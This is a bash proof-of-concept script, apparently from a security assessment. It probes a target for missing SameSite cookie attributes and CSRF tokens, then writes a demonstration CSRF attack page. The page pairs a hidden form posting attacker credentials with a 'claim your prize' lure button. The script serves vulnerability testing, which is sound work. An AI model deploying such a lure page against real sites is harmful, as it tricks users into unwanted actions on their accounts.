#!/bin/bash

# POC: No SameSite Cookie Attribute - CSRF Vulnerability Check
# This script checks if the application properly implements SameSite cookie attributes
# or if they are missing, creating a CSRF vulnerability

TARGET="${1:-http://localhost}"

echo "=========================================="
echo "SameSite Cookie Attribute Vulnerability POC"
echo "=========================================="
echo "Target: $TARGET"
echo ""

# Test 1: Check initial page for Set-Cookie headers
echo "[TEST 1] Checking GET request for Set-Cookie headers..."
RESPONSE=$(curl -v "$TARGET/index.php" 2>&1)
SET_COOKIE_HEADERS=$(echo "$RESPONSE" | grep -i "^< set-cookie:")

if [ -z "$SET_COOKIE_HEADERS" ]; then
    echo "❌ RESULT: No Set-Cookie headers found"
    echo "   This means the application currently has no session management."
    echo "   VULNERABILITY: When sessions are implemented, SameSite will likely be missing."
else
    echo "✓ Found Set-Cookie headers:"
    echo "$SET_COOKIE_HEADERS"
    
    # Check if SameSite is present
    if echo "$SET_COOKIE_HEADERS" | grep -i "samesite" > /dev/null; then
        echo "✓ SameSite attribute found"
        if echo "$SET_COOKIE_HEADERS" | grep -i "samesite=strict" > /dev/null; then
            echo "✓ SameSite=Strict configured (SECURE)"
        elif echo "$SET_COOKIE_HEADERS" | grep -i "samesite=lax" > /dev/null; then
            echo "⚠ SameSite=Lax configured (MODERATE - some CSRF protection)"
        elif echo "$SET_COOKIE_HEADERS" | grep -i "samesite=none" > /dev/null; then
            echo "❌ SameSite=None configured (NO CSRF PROTECTION)"
        fi
    else
        echo "❌ VULNERABILITY: SameSite attribute is MISSING!"
        echo "   Cookies sent in cross-site requests, vulnerable to CSRF attacks"
    fi
fi

echo ""
echo "[TEST 2] Checking for CSRF token in login form..."
FORM_RESPONSE=$(curl -s "$TARGET/index.php")

if echo "$FORM_RESPONSE" | grep -i "csrf" > /dev/null || echo "$FORM_RESPONSE" | grep -i "nonce" > /dev/null; then
    echo "✓ CSRF protection found in form"
else
    echo "❌ VULNERABILITY: No CSRF token or nonce found in login form"
    echo "   Combined with missing SameSite, this creates a complete CSRF attack vector"
fi

echo ""
echo "[TEST 3] Attempting cross-site login request simulation..."
echo "Creating a CSRF attack scenario..."
echo ""

# Create a test HTML file to demonstrate CSRF attack
CSRF_TEST_FILE="/tmp/csrf_attack_test.html"
cat > "$CSRF_TEST_FILE" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Demonstration</title>
</head>
<body>
    <h1>Legitimate Website</h1>
    <p>Click the button below (simulates attacker's malicious page):</p>
    
    <!-- Hidden form that auto-submits to target application -->
    <form id="csrf_form" action="http://localhost/index.php" method="POST" style="display:none;">
        <input type="hidden" name="username" value="attacker">
        <input type="hidden" name="password" value="malicious">
    </form>
    
    <button onclick="document.getElementById('csrf_form').submit();">
        Click here to claim your prize!
    </button>
    
    <script>
        // Alternative: Auto-submit on page load
        // window.onload = function() { document.getElementById('csrf_form').submit(); };
    </script>
</body>
</html>
EOF

echo "✓ Created CSRF attack HTML at: $CSRF_TEST_FILE"
echo ""
echo "CSRF Attack Scenario:"
echo "- Attacker creates a malicious webpage with a hidden form"
echo "- User visits the malicious page while logged into the target application"
echo "- Without SameSite=Strict, the browser sends the session cookie automatically"
echo "- The form submits to the target application as if the user clicked it"
echo "- Attacker can perform actions on behalf of the victim"
echo ""

echo "[TEST 4] Security Assessment Summary"
echo "===================================="
echo ""
echo "Current State:"
echo "- Set-Cookie headers: $([ -z "$SET_COOKIE_HEADERS" ] && echo "NOT IMPLEMENTED" || echo "PRESENT")"
echo "- SameSite attribute: $(echo "$SET_COOKIE_HEADERS" | grep -i "samesite" > /dev/null && echo "PRESENT" || echo "MISSING")"
echo "- CSRF tokens: $(echo "$FORM_RESPONSE" | grep -i "csrf\|nonce" > /dev/null && echo "PRESENT" || echo "MISSING")"
echo ""
echo "Vulnerability Assessment:"
echo "❌ No SameSite Cookie Protection - VULNERABLE to CSRF"
echo "❌ No CSRF Tokens in Forms - VULNERABLE to CSRF"
echo "❌ Combined CSRF Vulnerability - CRITICAL RISK"
echo ""
echo "Attack Vector: An attacker can perform unauthorized actions on behalf of"
echo "             authenticated users through cross-site request forgery."
echo ""
echo "=========================================="